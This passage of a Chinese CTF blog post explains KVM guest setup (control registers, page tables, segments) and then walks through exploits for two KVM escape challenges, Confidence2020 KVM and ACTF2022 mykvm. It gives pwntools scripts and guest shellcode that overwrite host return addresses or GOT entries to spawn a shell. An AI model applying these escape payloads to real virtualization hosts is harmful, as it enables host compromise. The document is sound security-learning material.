class="keyword">unsigned</span> <span class="keyword">int</span> code_size = <span class="number">-1</span>;</span><br><span class="line">    read_n(<span class="keyword">sizeof</span>(<span class="number">4</span>), &amp;code_size);</span><br><span class="line">    <span class="keyword">if</span> (code_size &gt; <span class="number">0x4000</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\n[init] hold your horses&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read_n(code_size, aligned_guest_mem);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> kvm_fd = open(<span class="string">&quot;/dev/kvm&quot;</span>, O_CLOEXEC|O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> vm_fd = ioctl(kvm_fd, KVM_CREATE_VM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_userspace_memory_region</span> <span class="title">region</span> =</span> &#123;</span><br><span class="line">        .slot = <span class="number">0</span>,</span><br><span class="line">        .flags = <span class="number">0</span>,</span><br><span class="line">        .guest_phys_addr = <span class="number">0</span>,</span><br><span class="line">        .memory_size = <span class="number">0x8000</span>,</span><br><span class="line">        .userspace_addr = aligned_guest_mem</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(vm_fd, KVM_SET_USER_MEMORY_REGION, &amp;region);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> vcpu_fd = ioctl(vm_fd, KVM_CREATE_VCPU, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> vcpu_mmap_size = ioctl(kvm_fd, KVM_GET_VCPU_MMAP_SIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_run</span> *<span class="title">run_mem</span> =</span> mmap(<span class="literal">NULL</span>, vcpu_mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, vcpu_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_regs</span> <span class="title">guest_regs</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;guest_regs, <span class="number">0</span>, <span class="keyword">sizeof</span>(guest_regs));</span><br><span class="line">    guest_regs.rsp = <span class="number">0xff0</span>;</span><br><span class="line">    guest_regs.rflags = <span class="number">2</span>; <span class="comment">// required</span></span><br><span class="line">    ioctl(vcpu_fd, KVM_SET_REGS, &amp;guest_regs);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_sregs</span> <span class="title">guest_sregs</span>;</span></span><br><span class="line">    ioctl(vcpu_fd, KVM_GET_SREGS, &amp;guest_sregs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Setup paging long mode.</span></span><br><span class="line">    guest_sregs.cr0 = CR0_PE | CR0_MP | CR0_ET | CR0_NE | CR0_WP | CR0_AM | CR0_PG;</span><br><span class="line">    guest_sregs.cr4 = CR4_PAE;</span><br><span class="line">    guest_sregs.efer = EFER_LMA | EFER_LME;</span><br><span class="line">    guest_sregs.cr3 = <span class="number">0x4000</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x4000</span>) = <span class="number">0x5003</span>; <span class="comment">// P4 Table[0]</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x5000</span>) = <span class="number">0x6003</span>; <span class="comment">// P3 Table[0]</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x6000</span>) = <span class="number">0x7003</span>; <span class="comment">// P2 Table[0]</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7000</span>) = <span class="number">0x3</span>;    <span class="comment">// P1 Table[0]</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7008</span>) = <span class="number">0x1003</span>; <span class="comment">// P1 Table[1]</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7010</span>) = <span class="number">0x2003</span>; <span class="comment">// P1 Table[2]</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7018</span>) = <span class="number">0x3003</span>; <span class="comment">// P1 Table[3]</span></span><br><span class="line">    <span class="comment">// meaning 0x0, 0x1000, 0x2000, 0x3000 are physical pages</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Setup segments</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_segment</span> <span class="title">seg</span> =</span> &#123;</span><br><span class="line">        .base = <span class="number">0</span>,</span><br><span class="line">        .limit = <span class="number">0xffffffff</span>,</span><br><span class="line">        .selector = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">        .present = <span class="number">1</span>,</span><br><span class="line">        .type = <span class="number">11</span>, <span class="comment">/* Code: execute, read, accessed */</span></span><br><span class="line">        .dpl = <span class="number">0</span>,</span><br><span class="line">        .db = <span class="number">0</span>,</span><br><span class="line">        .s = <span class="number">1</span>, <span class="comment">/* Code/data */</span></span><br><span class="line">        .l = <span class="number">1</span>,</span><br><span class="line">        .g = <span class="number">1</span>, <span class="comment">/* 4KB granularity */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    copy_kvm_segment(&amp;(guest_sregs.cs),&amp;seg);</span><br><span class="line">	seg.type = <span class="number">3</span>; <span class="comment">/* Data: read/write, accessed */</span></span><br><span class="line">	seg.selector = <span class="number">2</span> &lt;&lt; <span class="number">3</span>;</span><br><span class="line">    copy_kvm_segment(&amp;(guest_sregs.ds),&amp;seg);</span><br><span class="line">    copy_kvm_segment(&amp;(guest_sregs.es),&amp;seg);</span><br><span class="line">    copy_kvm_segment(&amp;(guest_sregs.fs),&amp;seg);</span><br><span class="line">    copy_kvm_segment(&amp;(guest_sregs.gs),&amp;seg);</span><br><span class="line">    copy_kvm_segment(&amp;(guest_sregs.ss),&amp;seg);</span><br><span class="line">    ioctl(vcpu_fd, KVM_SET_SREGS, &amp;guest_sregs);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        ioctl(vcpu_fd, KVM_RUN, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (run_mem-&gt;exit_reason == KVM_EXIT_HLT || run_mem-&gt;exit_reason == KVM_EXIT_SHUTDOWN)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (run_mem-&gt;exit_reason == KVM_EXIT_IO) &#123;</span><br><span class="line">            <span class="keyword">if</span> (run_mem-&gt;io.direction == KVM_EXIT_IO_OUT &amp;&amp; run_mem-&gt;io.port == <span class="number">0x3f8</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%.*s&quot;</span>, </span><br><span class="line">                    run_mem-&gt;io.count * run_mem-&gt;io.size,</span><br><span class="line">                    run_mem-&gt;request_interrupt_window + run_mem-&gt;io.data_offset);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n[loop] exit reason: %d\n&quot;</span>, run_mem-&gt;exit_reason);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n[loop] goodbye!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>又看了两天的理论知识，终于能完全看懂上面的kvm实例了，主要的难点在于理解vcpu的特殊寄存器的设置上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">guest_sregs.cr0 = CR0_PE | CR0_MP | CR0_ET | CR0_NE | CR0_WP | CR0_AM | CR0_PG;</span><br><span class="line">guest_sregs.cr4 = CR4_PAE;</span><br><span class="line">guest_sregs.efer = EFER_LMA | EFER_LME;</span><br></pre></td></tr></table></figure>

<p>他首先设置了cr0寄存器，这个寄存器是控制寄存器，每一位都是一个开关，其中<code>CR0_PE</code>就是开起了保护模式，<code>CR0_PG</code>开启了分页管理模式，相当于开起了MMU地址翻译，后续还会设置页表和cr3寄存器，然后cr4寄存器和efer寄存器的设置都是为了开启64位模式，因为如果开启了保护模式默认是32位的。这块多亏了xxrw学长才理解。膜</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220718125951256.png" alt="image-20220718125951256"></p>
<p>然后他设置了cr3寄存器然后初始化了四级页表,理解这块得需要操作系统中虚拟地址到物理地址翻译的知识，前三级页表都只有一个页表项，指向下一级页表，第四级页表的页表项记录的是<code>物理地址</code>，一共有四项，0,1,2,3,所以一共可以翻译4*4k的页面，比如0x0就会落入第四级页表的第0项，最后翻译成物理地址也是0,0x2000就会落入第四级页表的第2项，最后翻译的物理地址是0x2000,所以这个页表翻译了和没翻译差不多。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">guest_sregs.cr3 = <span class="number">0x4000</span>;</span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x4000</span>) = <span class="number">0x5003</span>; <span class="comment">// P4 Table[0]</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x5000</span>) = <span class="number">0x6003</span>; <span class="comment">// P3 Table[0]</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x6000</span>) = <span class="number">0x7003</span>; <span class="comment">// P2 Table[0]</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7000</span>) = <span class="number">0x3</span>;    <span class="comment">// P1 Table[0]</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7008</span>) = <span class="number">0x1003</span>; <span class="comment">// P1 Table[1]</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7010</span>) = <span class="number">0x2003</span>; <span class="comment">// P1 Table[2]</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7018</span>) = <span class="number">0x3003</span>; <span class="comment">// P1 Table[3]</span></span><br><span class="line"><span class="comment">// meaning 0x0, 0x1000, 0x2000, 0x3000 are physical pages</span></span><br></pre></td></tr></table></figure>

<p>然后就是段寄存器的设置了，使用的是<code>kvm_segment</code>结构体，我的理解这不仅是对cs寄存器的设置，更准确的说是对段描述符的设置，这个<code>kvm_segment</code>就是对段描述符的虚拟，其中base就是段描述符的基址，limit是段描述符的长度，他和<code>g</code>搭配使用当g=1时，段的长度是以4k为单位的，所以段的最大大小就是2^32*4K,如果g=0,段的长度就是以字节为单位的。selector和present不清楚，type就是设置段是什么段，下面的代码表示是代码段，段描述符是保护模式必要的要素。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_segment</span> <span class="title">seg</span> =</span> &#123;</span><br><span class="line">    .base = <span class="number">0</span>,</span><br><span class="line">    .limit = <span class="number">0xffffffff</span>,</span><br><span class="line">    .selector = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">    .present = <span class="number">1</span>,</span><br><span class="line">    .type = <span class="number">11</span>, <span class="comment">/* Code: execute, read, accessed */</span></span><br><span class="line">    .dpl = <span class="number">0</span>,</span><br><span class="line">    .db = <span class="number">0</span>,</span><br><span class="line">    .s = <span class="number">1</span>, <span class="comment">/* Code/data */</span></span><br><span class="line">    .l = <span class="number">1</span>,</span><br><span class="line">    .g = <span class="number">1</span>, <span class="comment">/* 4KB granularity */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>然后程序就进入虚拟机开始执行指令了，既然看懂了这段代码终于可以正向做题了。</p>
<h2 id="kvm题目复现"><a href="#kvm题目复现" class="headerlink" title="kvm题目复现"></a>kvm题目复现</h2><h3 id="Confidence2020-CTF-KVM"><a href="#Confidence2020-CTF-KVM" class="headerlink" title="Confidence2020 CTF KVM"></a>Confidence2020 CTF KVM</h3><p>主要的漏洞点在虚拟vm的内存时候发生了问题，他把host程序的返回地址也映射到guest内存中，导致可以在guest中修改</p>
<p>host进程的返回地址，然后利用<code>hlt</code>指令退出guest返回host进程，然后退出main函数时getshell.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x8000</span>uLL);</span><br><span class="line">v14 = &amp;s[<span class="number">4096LL</span> - (((<span class="keyword">unsigned</span> __int16)&amp;savedregs + <span class="number">32752</span>) &amp; <span class="number">0xFFF</span>)];</span><br><span class="line"></span><br><span class="line">  v25[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v25[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">0LL</span>;</span><br><span class="line">  v27 = <span class="number">0x8000</span>LL;</span><br><span class="line">  v28 = v14;</span><br></pre></td></tr></table></figure>

<p>漏洞利用一共分三步，第一步伪造新的页表项，因为原来页表项只能访问到[0<del>0x4000],而返回地址在[0x7000</del>0x8000],所以得伪造新的页表，然后修改cr3寄存器，让指令可以访问到返回地址所在的区域.我们选择让cr3=0x1000</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov qword ptr [0x1000],0x2003</span><br><span class="line">mov qword ptr [0x2000],0x3003</span><br><span class="line">mov qword ptr [0x3000], 0x3</span><br><span class="line">mov qword ptr [0x0], 0x7003</span><br><span class="line">mov rax, 0x1000</span><br><span class="line">mov cr3, rax</span><br></pre></td></tr></table></figure>

<p>现在当我们访问0x0地址的时候，就会访问到0x7000的地方，然后开始线性查找，找到返回地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x1050</span><br><span class="line">look_for_return:</span><br><span class="line">	add rax, 0x8</span><br><span class="line">	cmp qword ptr [rax], 0</span><br><span class="line">	je look_for_return</span><br><span class="line">add rax, 0x18</span><br></pre></td></tr></table></figure>

<p>此时rax就指向了retrun的返回地址了，然后通过加减预算把他改为ogg</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rcx, qword ptr [rax]</span><br><span class="line">add rcx, 0x249e6</span><br><span class="line">mov qword ptr [rax], rcx</span><br><span class="line">hlt</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> code <span class="keyword">import</span> interact</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process(<span class="string">&quot;./kvm&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov qword ptr [0x1000],0x2003</span></span><br><span class="line"><span class="string">mov qword ptr [0x2000],0x3003</span></span><br><span class="line"><span class="string">mov qword ptr [0x3000], 0x3</span></span><br><span class="line"><span class="string">mov qword ptr [0x0], 0x3</span></span><br><span class="line"><span class="string">mov qword ptr [0x8], 0x7003</span></span><br><span class="line"><span class="string">mov rax, 0x1000</span></span><br><span class="line"><span class="string">mov cr3, rax</span></span><br><span class="line"><span class="string">mov rax, 0x1050</span></span><br><span class="line"><span class="string">look_for_return:</span></span><br><span class="line"><span class="string">	add rax, 0x8</span></span><br><span class="line"><span class="string">	cmp qword ptr [rax], 0</span></span><br><span class="line"><span class="string">	je look_for_return</span></span><br><span class="line"><span class="string">add rax, 0x18</span></span><br><span class="line"><span class="string">mov rcx, qword ptr [rax]</span></span><br><span class="line"><span class="string">add rcx, 0x249e6</span></span><br><span class="line"><span class="string">mov qword ptr [rax], rcx</span></span><br><span class="line"><span class="string">hlt</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gdb.attach(sh,<span class="string">&#x27;b *(0x555555554000 +&#123;0&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="number">0xFD3</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    shellcode_len=<span class="built_in">len</span>(asm(shellcode))</span><br><span class="line"></span><br><span class="line">    sh.send(p32(shellcode_len))</span><br><span class="line">    sh.sendline(asm(shellcode))</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>有一个问题我目前不能理解，就是给第四级页表第0项设置非0的物理内存，然后翻译的时候guest就会退出，然后kvm爆<code>KVM_EXIT_SHUTDOWN</code>的退出原因，第四级页表第0项对应的虚拟地址就是0x0~0xfff,可能这个地址有啥特殊的吧,不能随便设置。</p>
<p>复现完之后发现也不是很难，但是自己从开始学习到复现用了快一周的时间，我是猪鼻，除了上述做法伪造页表之外，我觉得理论上还存在一种做法，即从保护模式中返回到实模式，就可以不用伪造页表直接进行任意<code>物理</code>地址访问了，但看了一些资料看不懂捏，后面有时间再捣鼓捣鼓。</p>
<h3 id="ACTF2022-mykvm"><a href="#ACTF2022-mykvm" class="headerlink" title="ACTF2022  mykvm"></a>ACTF2022  mykvm</h3><p>和上一题类似，都是设置vm的内存时大小设置不合理，导致可以在guest可以越界访存host进程的信息，比如在这道题中guest可以访问到dest地址，然后还对分配给guest的内存不清0，导致可以leak出栈地址和libc地址。这道题一共有两种解法</p>
<h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>kvm进入guest的时候默认是16位实模式的，解法一就是在直接实模式中通过<code>out</code>指令leak出libc地址，然后修改dest指针，使其指向<code>puts_got</code>附近,在退出虚拟机后执行<code>memcpy(dest, *(const void **)&amp;nbytes[1], 0x20uLL);</code>时把got表项改成ogg,然后执行<code>puts(&quot;Bye!&quot;);</code>来getshell.不过程序使用readline()函数接收数据，所以字符必须是可见字符，这就对ogg地址的输入造成了困难，解决办法是只写got的后三个字节，但是这三个字节也有可能不是可见字符，所以具有一定概率性，我的脚本之所以没有爆破原因是我在本地复现的，而且把aslr关了，我直接选了后三个字符是可见字符的ogg来打的</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process(<span class="string">&quot;./mykvm&quot;</span>)</span><br><span class="line">kvm=ELF(<span class="string">&quot;./mykvm&quot;</span>)</span><br><span class="line">puts_got=kvm.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.code16</span></span><br><span class="line"><span class="string">mov bx, 0x3f8</span></span><br><span class="line"><span class="string">get_libc:</span></span><br><span class="line"><span class="string">    mov al, byte ptr [bx]</span></span><br><span class="line"><span class="string">    out 1,al</span></span><br><span class="line"><span class="string">    add bx, 1</span></span><br><span class="line"><span class="string">    cmp bx,0x400</span></span><br><span class="line"><span class="string">    jne get_libc</span></span><br><span class="line"><span class="string">mov bx,0x7100</span></span><br><span class="line"><span class="string">mov byte ptr [bx], 0x0b</span></span><br><span class="line"><span class="string">mov byte ptr [bx+1], 0x20</span></span><br><span class="line"><span class="string">mov byte ptr [bx+2], 0x60</span></span><br><span class="line"><span class="string">hlt</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh,<span class="string">&#x27;b *(0x400000 +&#123;0&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x1127</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;your code size: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;your code: &quot;</span>)</span><br><span class="line">    sh.send(shellcode)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;guest name: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;jingyinghua&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;guest passwd: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;123123&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;123123\n&quot;</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    libc_base=u64(sh.recv(<span class="number">8</span>))-<span class="number">0x8149d8</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;host name: &quot;</span>)</span><br><span class="line">    ogg_addr=libc_base+<span class="number">0xf1247</span></span><br><span class="line">    sh.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1d</span>+p32(ogg_addr&amp;<span class="number">0xffffff</span>))</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>在实模式中可以通过段寄存器:[通用寄存器]来达到2^20的寻址，也可以直接通过通用寄存器来寻址比如<code>mov byte ptr [bx], 0x0b</code>,但注意地址不能超过0x10000</p>
<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>相较于解法就麻烦很多，而且也是爆破，和解法一相比稳定性差不多吧，这种解法就是设置gdt端描述表，然后修改cr0寄存进入保护模式，进入保护模式默认就进入了32位，这样寻址范围就高达4G，就可以直接利用<code>0x60a100</code>里的堆地址,然后然后利用这个指针泄露libc地址，然后修改0x40的fastbin上的第一个堆块的fd为<code>0x602032</code>,这段空间在<code>memcpy_got</code>附近，然后修改dest指针指向的堆块保存’/bin/sh’字符串，在退出虚拟机后就可以利用readline函数申请到这段空间，然后修改<code>memcpy_got</code>后两个字节为<code>do_system</code>地址。最后就是执行<code>memcpy(des)</code>相当于执行了<code>system(&#39;/bin/sh&#39;)</code>,但是由于readline函数会对字符最后清零<code>\x00</code>,所以得爆破让<code>do_system</code>地址的倒数第三个字节为0才行，这个得爆一会。</p>
<p>交互脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> S</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">kvm=ELF(<span class="string">&quot;./mykvm&quot;</span>)</span><br><span class="line">puts_got=kvm.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"><span class="comment"># 